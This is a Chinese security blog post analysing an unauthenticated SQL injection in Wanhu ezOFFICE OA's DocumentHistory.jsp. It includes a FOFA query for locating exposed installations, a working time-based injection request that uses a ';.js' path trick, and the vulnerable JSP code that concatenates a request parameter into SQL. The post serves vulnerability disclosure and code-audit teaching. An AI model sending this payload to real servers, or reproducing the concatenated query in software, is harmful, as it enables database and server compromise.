---
title: "万户OA DocumentHistory.jsp SQL注入漏洞"
source: https://mrxn.net/jswz/defaultroot-ezOFFICE-DocumentHistory-sqli.html
asset_dir: assets/万户oa-documenthistory.jsp-sql注入漏洞
---

# 万户OA DocumentHistory.jsp SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/7 19:52
- 1441浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

代码安全审计

安全

软件

---

# 0x01 产品简介

万户OA [ezoffice](https://mrxn.net/tag/ezoffice "ezoffice") 是万户网络协同办公产品多年来一直将主要精力致力于中高端市场的一款OA协同办公[软件](#)产品，统一的基础管理平台，实现用户数据统一管理、权限统一分配、身份统一认证。统一规划门户网站群和协同办公平台，将外网信息维护、客户服务、互动交流和日常工作紧密结合起来，有效提高工作效率。

SQL注入防护

# 0x02 漏洞概述

万户 ezOFFICE DocumentHistory.jsp 接口存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，未授权的攻击者可利用此[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")获取数据库权限，深入利用可获取服务器权限。

# 0x03 复现环境

本地环境 OR FOFA：app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE"

# 漏洞复现

```
GET /defaultroot/public/iSignatureHTML.jsp/DocumentHistory.jsp;.js?DocumentID=1'+WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
Host: 192.168.22.187:7001
```

成功延时 5 秒  
[[![万户OA DocumentHistory.jsp SQL注入漏洞](images/img-001-8ada137faa0c.png)](https://mrxn.net/content/uploadfile/202501/c7291736258061.png)](https://mrxn.net/content/uploadfile/202501/c7291736258061.png)

# 漏洞分析

> 关于鉴权绕过，参考这篇文章：[万户 ezOFFICE ajax\_checkUserNum.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-ajax_checkUserNum-sqli.html)
>
> 代码安全审计

public/iSignatureHTML.jsp/DocumentHistory.jsp 代码如下，非常简单！

```
<%

  DocumentID=request.getParameter("DocumentID"); //取得编号

%>
......
<%
  if (ObjConnBean.OpenConnection()) {
    ResultSet rs = null;
    Statement stmt = null;

    System.out.println(DocumentID);
    System.out.println("开始");

 try {
      String strSql = "select * from HTMLHistory Where DocumentID='" + DocumentID + "'"+"order by SignatureID desc";
      rs = ObjConnBean.ExecuteQuery(strSql);
      System.out.println("错误");
       while (rs.next()){
%>
```

`DocumentID` 通过 `request.getParameter` 获取后直接拼接进 `SQL` 语句，然后执行，造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞，也是这么朴实无华！

漏洞修复方案

# 最后

其他万户OA 相关漏洞  
[万户 ezOFFICE selectAmountField.jsp SQL注入漏洞](https://mrxn.net/jswz/defaultroot-ezOFFICE-selectAmountField-sqli.html)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#ezOFFICE](https://mrxn.net/tag/ezOFFICE)

---

文章目录

- [1.0x01 产品简介](#toc-1-)
- [2.0x02 漏洞概述](#toc-2-)
- [3.0x03 复现环境](#toc-3-)
- [4.漏洞复现](#toc-4-)
- [5.漏洞分析](#toc-5-)
- [6.最后](#toc-6-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
